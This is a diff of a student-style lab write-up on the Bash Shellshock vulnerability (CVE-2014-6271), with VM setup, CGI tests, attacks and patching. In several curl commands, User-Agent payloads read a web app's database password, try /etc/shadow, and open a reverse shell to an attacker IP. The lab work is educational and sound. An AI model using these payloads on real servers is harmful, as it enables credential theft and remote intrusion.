@@ -7,17 +7,17 @@ For identifying different bash used, I also modified the value of `$PS1` by the 
 $ export PS1="[$0]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "
 ```
 Image below shows the result after set the variable, which will display the bash file used. 
-![](/assets/images/media/16326883206491/16327539597252.jpg)
+![](/assets/images/16326883206491/16327539597252.jpg)
 I also stored the command in the `.bashrc` file to set the format after open a new bash automatically. I used the echo command below with `>>` to attach the command, and `grep` to verify: 
 ```shell
 $ echo 'export PS1="[$0]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
 $ cat ~/.bashrc | grep -s "export PS1"
 ```
 Image below shows the outputs for them. 
-![](/assets/images/media/16326883206491/16327540241642.jpg)
+![](/assets/images/16326883206491/16327540241642.jpg)
 ### 1.2 Execute the bash_shellshock
 Finally, I executed the `$ /bin/bash_shellshock` as required. Image below show the output after executing.  
-![](/assets/images/media/16326883206491/16327541146545.jpg)
+![](/assets/images/16326883206491/16327541146545.jpg)
 
 ## Task02 
 ### 2.1 Create the myprog.cgi and make it execuatable
@@ -37,7 +37,7 @@ echo "Hello World"
 ```
 ### 2.2 Execute the program by curl
 After that we executed the `curl http://localhost/cgi-bin/myprog.cgi` to access the program through server. Its output is shown in the image below, which worked well on the both two versions for Bash. 
-![](/assets/images/media/16326883206491/16326983371851.jpg)
+![](/assets/images/16326883206491/16326983371851.jpg)
 
 ## Task03
 ### 3.1 Modify the code in myprog.cgi
@@ -57,7 +57,7 @@ Therefore, we can use the option `-A` to define the user agent of our request, w
 $ curl http://localhost/cgi-bin/myprog.cgi -A "TEST" | grep USER_AGENT
 ```
 The command above were used, in which we specified the user agent by `-A "TEST"`. Besides, we used `grep` to search all environmental variables to find out value of the `HTTP_USER_AGENT`. Image below is the output for the command: 
-![](/assets/images/media/16326883206491/16326984887666.jpg)
+![](/assets/images/16326883206491/16326984887666.jpg)
 
 ## Task04
 ### 4.1 Launch an attack 
@@ -69,18 +69,18 @@ $ curl http://localhost/cgi-bin/myprog.cgi -s -A \
 | grep -s 'dbpass = ' 
 ```
 Our code tries to steal the database password stored inside the `setting.php` file. `echo Content_type: text/plain;` is also essential, which defines a field in the head of the response. Without such a field, PHP will return an error.  Image below is the output of the command, which shows us the password of the database. 
-![](/assets/images/media/16326883206491/16326999112287.jpg)
+![](/assets/images/16326883206491/16326999112287.jpg)
 
 ### 4.2 Why not /etc/shadow?
 I do not think it is possible to remotely access the script's `/etc/shadow` file because that file is only readable with the root privilege. We used the `ll` command to verify that and tried to access that file by `cat`. The image below shows what we got. 
-![](/assets/images/media/16326883206491/16327003348200.jpg)
+![](/assets/images/16326883206491/16327003348200.jpg)
 
 We still used command below to launch an attack, but the `curl` did not response any useful information this time. 
 ```shell
 curl http://localhost/cgi-bin/myprog.cgi -v -A "() { echo hello; }; echo Content_type: text/plain;echo; /bin/cat /etc/shadow" -v
 ```
 We also tried to use option `-v` (verbose) to get more information. The image below is the output, in which the content-length is zero. 
-![](/assets/images/media/16326883206491/16327005370706.jpg)
+![](/assets/images/16326883206491/16327005370706.jpg)
 
 ## TASK05
 ### 5.1 Prepare for server and client
@@ -94,7 +94,7 @@ $ echo 'export PS1="[ATC]\[\e[1;31m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
 $ source ~/.bashrc
 ```
 We also used the commands above to configure their bash prompt, which can help us identify them more easily. As the image shows, we used the left one as server and right one as attacker. 
-![](/assets/images/media/16326883206491/16327681715222.jpg)
+![](/assets/images/16326883206491/16327681715222.jpg)
 
 ### 5.2 Reverse Shell
 We used two key steps to get a reverse shell: First, the attacker need to start a TCP server to listening a specific port number, which will be used to interact with the bash program on a victim server; Second is to make the server change its `stdout`, `stdin` and `stderr` to TCP socket connected with the IP and port number of the attacker's device.  
@@ -113,7 +113,7 @@ In the command, the option `i` means the interactive model that will show the ba
 
 #### 5.2.3 Commands outputs
 The image below shows the outputs of our commands. The left is our victim server and the right is our attacker. We started the `netcat` program at first, and it successfully connected with the $10.0.2.6$ (server's IP), after executing of the `bash -i ...` command on the server. We verified the attack by `hostname -I` which can output all IP addresses of a device. 
-![](/assets/images/media/16326883206491/16327685275524.jpg)
+![](/assets/images/16326883206491/16327685275524.jpg)
 
 ### 5.3 Launch an attack
 To launch an attack, we need run two terminals on the attacker vm. One is used to listen the TCP socket at $9090$, and another is used for send the data to our victim server by `curl`. 
@@ -126,7 +126,7 @@ $ curl http://10.0.2.6/cgi-bin/myprog.cgi -v -A \
 /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1"
 ```
 Image below shows that we successfully access the bash in the victim server as `www-data` user. 
-![](/assets/images/media/16326883206491/16327698266434.jpg)
+![](/assets/images/16326883206491/16327698266434.jpg)
 
 
 ## TASK06
@@ -134,11 +134,11 @@ Image below shows that we successfully access the bash in the victim server as `
 ### 6.1 Discussion
 After reviewing the diff file there, we find three change: 
 * The first is the `common.h` file, in which two flags are added. The comments here mentions that they are used for checking validation of the function definitions and the number of commands. 
-![](/assets/images/media/16326883206491/16327633385051.jpg)
+![](/assets/images/16326883206491/16327633385051.jpg)
 * The second is the `evalstring.c` file. The codes in Line25 to 32 do check the validation of functions in the environmental variables. It will stop the following codes if it is invalid. There is also another check in Line 41 for the number of commands. It will also stop if the number is over one. 
-![](/assets/images/media/16326883206491/16327636141383.jpg)
+![](/assets/images/16326883206491/16327636141383.jpg)
 * The final one is `variables.c` file, where the program checks the name of environmental variables. The variables names with invalid identifiers will not be converted to a function anymore. 
-![](/assets/images/media/16326883206491/16327641269129.jpg)
+![](/assets/images/16326883206491/16327641269129.jpg)
 
 In conclusion, the bash program will check the validation for both the environment variable's contents and names. It will be converted into a function in the subprocess only if valid in its name and contents. 
 ### 6.2 Patch Bash 4.2
@@ -149,7 +149,7 @@ $ cd bash-4.2
 $ patch -p1 < ../CVE-2014-6271.diff
 ```
 The image shows outputs that we got. The patches are successfully applied to the three `.c` files we mentioned before. 
-![](/assets/images/media/16326883206491/16327645447441.jpg)
+![](/assets/images/16326883206491/16327645447441.jpg)
 
 After that, we configured and compiled the patched `Bashv4.2` using the commands below: 
 ```shell
@@ -160,7 +160,7 @@ $ make
 ```
 
 
-![](/assets/images/media/16326883206491/16327659716758.jpg)
+![](/assets/images/16326883206491/16327659716758.jpg)
 
 ### 6.3 Redo Task03
 #### 6.3.1 Modified the myprog.cgi
@@ -179,7 +179,7 @@ We executed the command below again to check whether the variable `HTTP_USER_AGE
 $ curl http://localhost/cgi-bin/myprog.cgi -A "TEST" | grep USER_AGENT
 ```
 Image below shown that the user-agent is still changed in the patched bash. 
-![](/assets/images/media/16326883206491/16327666168176.jpg)
+![](/assets/images/16326883206491/16327666168176.jpg)
 
 ### 6.4 Redo Task04
 We were curious whether our attack still work. Therefore, we execute the attack command below again. 
@@ -189,7 +189,7 @@ $  curl http://localhost/cgi-bin/myprog.cgi -s -A \
 /bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php"
 ```
 The image below shows that previous attack commands cannot work anymore. The server handler our user-agent value as an environmental variable instead of a function. Furthermore, the malicious code did not execute in this case. 
-![](/assets/images/media/16326883206491/16327670674094.jpg)
+![](/assets/images/16326883206491/16327670674094.jpg)
 
 #### 6.5 Redo Task05
 We firstly re-tried the reveres bash. We reused all previous commands in task05, and these codes are demonstrated below. 
@@ -206,7 +206,7 @@ $ /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
 
 ```
 Image below is the output, where the reverse bash still work. It is because it do not use the `Bash v4.2` in there. 
-![](/assets/images/media/16326883206491/16327700510840.jpg)
+![](/assets/images/16326883206491/16327700510840.jpg)
 
 After that, we re-launched the attack by the http server. We opened two terminals again, and used the commands below: 
 ```shell
@@ -218,4 +218,4 @@ $ curl http://10.0.2.6/cgi-bin/myprog.cgi -v -A \
 /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1"
 ```
 The image below shows their output. The `curl` did not work as expect under the patched `Bash v2.4`, which correctly handled all environmental variables. 
-![](/assets/images/media/16326883206491/16327703950349.jpg)
+![](/assets/images/16326883206491/16327703950349.jpg)
